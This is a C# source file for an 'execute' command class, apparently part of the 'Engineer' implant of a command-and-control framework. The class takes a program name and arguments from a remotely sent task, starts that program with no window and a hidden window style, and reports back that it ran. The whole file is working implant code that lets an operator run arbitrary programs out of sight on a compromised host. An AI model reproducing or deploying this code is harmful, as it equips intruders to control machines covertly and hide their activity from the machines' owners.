using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class ExecuteCommand : EngineerCommand
    {
        public override string Name => "execute";

        public override async Task Execute(EngineerTask task)
        {
            try
            {

                task.Arguments.TryGetValue("/command", out string command);
                task.Arguments.TryGetValue("/args", out string argument);
                if (command == null)
                {
                    Tasking.FillTaskResults("Command not specified", task,EngTaskStatus.FailedWithWarnings);
                    return;
                }
                if (argument == null)
                {
                    Tasking.FillTaskResults("Arguments not specified", task, EngTaskStatus.FailedWithWarnings);
                    return;
                }

                var output = new StringBuilder();

                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        WorkingDirectory = Directory.GetCurrentDirectory(),
                        FileName = command,
                        Arguments = argument,
                        UseShellExecute = true,
                    }
                };

                process.Start();
                Tasking.FillTaskResults($"{command} executed",task,EngTaskStatus.Complete);
            }
            catch (Exception e)
            {
                Tasking.FillTaskResults(e.Message,task,EngTaskStatus.Failed);
            }
        }
    }
}
